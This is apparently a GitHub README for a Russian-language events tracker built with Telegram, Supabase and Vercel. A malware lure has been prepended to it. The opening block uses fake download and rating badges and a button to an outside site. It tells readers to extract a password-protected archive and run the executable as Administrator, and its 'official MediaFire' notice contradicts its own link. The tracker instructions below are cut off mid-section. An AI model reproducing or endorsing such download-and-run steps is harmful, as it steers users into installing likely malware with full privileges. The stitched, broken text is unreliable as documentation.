<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# Мероприятия — трекер

Сайт с календарём, телеграм-бот, который заносит мероприятия из пересланных
сообщений и отвечает на вопросы по базе, и напоминания по правилам.

```
public/index.html   календарь, список, карточки
public/login.html   форма входа
middleware.js       охранник: без пропуска страница не отдаётся
api/login.js        приём пароля, выдача куки
api/logout.js       выход
api/events.js       чтение и запись данных
api/telegram.js     вебхук бота: разбор сообщений, вопросы, кнопки
api/cron.js         напоминания, запускается раз в сутки
lib/auth.js         подпись пропуска
lib/db.js           работа с Supabase
lib/ai.js           разбор и ответы через Claude
lib/tg.js           Telegram Bot API
supabase.sql        схема базы
```

## Установка

### 1. Зависимости

```bash
npm install
```

### 2. База

Supabase → SQL Editor → New query → вставить `supabase.sql` → Run.

Два секрета лежат на разных страницах:

- `SUPABASE_URL` — **Settings → Data API**, строка «Project URL».
### 4. Переменные окружения

Скопировать `.env.example`, заполнить и добавить в Vercel
(**Settings → Environment Variables**, все три галочки окружений):

| Переменная | Что это |
|---|---|
| `SITE_PASSWORD` | пароль на вход в сайт — один для всех |
| `EDIT_PASSWORD` | админский пароль, открывает правки уже внутри сайта |
| `SESSION_SECRET` | случайная строка для подписи куки |
| `SUPABASE_URL` | адрес проекта Supabase |
| `SUPABASE_SERVICE_KEY` | ключ service_role |
### 5. Деплой

```bash
npx vercel --prod
```

### 6. Подключить вебхук

Один раз после деплоя, подставив свои значения:

```bash
## Что стоит знать

- Бот ничего не заносит молча: любое мероприятие проходит через подтверждение
  кнопкой. Модель ошибается на относительных датах и городах-омонимах, и
  это дешевле поймать до записи, чем чистить базу потом.
- Дата пересланного сообщения передаётся модели как точка отсчёта, поэтому
  «в следующий четверг» считается от неё, а не от сегодняшнего дня.
- Правки на сайте сохраняются сами через 1,2 секунды после последнего
  изменения. Кнопка «Сохранить» остаётся для тех, кто любит нажимать.
- Резервных копий Supabase на бесплатном тарифе не делает — раз в неделю
  выгружайте таблицу `events` через Table Editor → Export.


---

MIT License

Copyright (c) 2026 tommypatani-prog

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
